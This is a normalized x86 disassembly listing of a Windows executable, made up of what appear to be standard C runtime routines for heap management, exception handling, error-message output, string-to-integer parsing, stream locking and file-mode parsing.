cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_40970d
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_409324
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_409274
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4099f4
push sub_409a50
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_409a50
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4061c0
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4061c0
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40a81c
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40a7d2
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4061c0
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4061c0
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_40a802
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40a81c
mov eax [ ebp + 0xc ]
push rw-data
call sub_40dc30
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4061c0
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40a7e9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4061c0
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_409bdc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_40fbde
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_40fbde
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_40bff0
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_40f1db
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_407dd4
add esp 0x14
push esi
call sub_40bff0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_40f1db
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_40bff0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_40f126
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_407dd4
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_40f05d
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_407dd4
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_407dd4
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_40fa75
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_407dd4
add esp 0x14
push r--data
push ebx
push edi
call sub_40f05d
add esp 0xc
test eax eax
je r-xdata
sub_409d87
push 0x3
call sub_40fbde
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_409bdc
push 0xff
call sub_409bdc
pop ecx
pop ecx
push 0x3
call sub_40fbde
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_409dcf
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_40778e
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_409e16
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_409ece
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_404a6a
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_407f64
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40b59f
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_407f64
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_40a0fd
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_409ece
add esp 0x14
pop ebp
retn
sub_40a12e
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40ed09
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40ed09
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40a1ff
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_408efb
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_40a240
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_408efb
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40a272
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_408e21
pop ecx
pop ebp
retn
sub_40a2ae
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_408e21
pop ecx
pop ebp
retn
sub_40a2dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4104ee
add esp 0x14
test eax eax
je r-xdata
call sub_407f64
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_410678
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
